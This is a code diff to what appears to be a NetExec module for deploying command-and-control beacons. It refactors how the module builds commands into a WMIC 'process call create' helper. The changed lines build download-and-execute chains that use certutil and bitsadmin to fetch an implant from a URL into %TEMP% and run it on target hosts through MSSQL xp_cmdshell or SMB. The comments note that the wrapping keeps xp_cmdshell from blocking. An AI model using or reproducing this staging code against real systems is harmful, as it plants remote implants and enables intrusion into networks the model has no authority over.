@@ -1285,6 +1285,10 @@ class NXCModule:
             if not self.staging:
                 self._cleanup_local_temp(self.local_implant_path)
 
+    def _build_wmic_command(self, inner_cmd):
+        """Wrap a command in WMIC for async fire-and-forget execution."""
+        return f'WMIC process call create "cmd /c {inner_cmd}"'
+
     def _run_beacon_staged_http(self, context, connection, os_type, arch, implant_name, handler):
         """
         Execute beacon via HTTP download staging.
@@ -1372,20 +1376,18 @@ class NXCModule:
                 # Certutil download + execute with WMIC for true async
                 # WMIC process call create is fire-and-forget - returns immediately
                 # Entire download+execute chain is wrapped in WMIC to prevent xp_cmdshell blocking
-                cmd = (
-                    f'WMIC process call create '
-                    f'"cmd /c certutil -urlcache -f {download_url} '
-                    f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}"'
+                cmd = self._build_wmic_command(
+                    f'certutil -urlcache -f {download_url} '
+                    f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
                 )
                 context.log.debug("Using certutil staging method")
             elif self.staging_method == "bitsadmin":
                 # BITSAdmin download + execute with WMIC for true async
                 # WMIC process call create is fire-and-forget - returns immediately
                 # Entire download+execute chain is wrapped in WMIC to prevent xp_cmdshell blocking
-                cmd = (
-                    f'WMIC process call create '
-                    f'"cmd /c bitsadmin /transfer job /download /priority high '
-                    f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}"'
+                cmd = self._build_wmic_command(
+                    f'bitsadmin /transfer job /download /priority high '
+                    f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
                 )
                 context.log.debug("Using bitsadmin staging method")
             else:
@@ -1492,18 +1494,16 @@ class NXCModule:
                 context.log.debug("Using PowerShell staging method via SMB")
             elif self.staging_method == "certutil":
                 # Certutil with WMIC wrapper for async (same pattern as MSSQL)
-                cmd = (
-                    f'WMIC process call create '
-                    f'"cmd /c certutil -urlcache -f {download_url} '
-                    f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}"'
+                cmd = self._build_wmic_command(
+                    f'certutil -urlcache -f {download_url} '
+                    f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
                 )
                 context.log.debug("Using certutil staging method via SMB")
             elif self.staging_method == "bitsadmin":
                 # Bitsadmin with WMIC wrapper for async (same pattern as MSSQL)
-                cmd = (
-                    f'WMIC process call create '
-                    f'"cmd /c bitsadmin /transfer job /download /priority high '
-                    f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}"'
+                cmd = self._build_wmic_command(
+                    f'bitsadmin /transfer job /download /priority high '
+                    f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}'
                 )
                 context.log.debug("Using bitsadmin staging method via SMB")
             else:
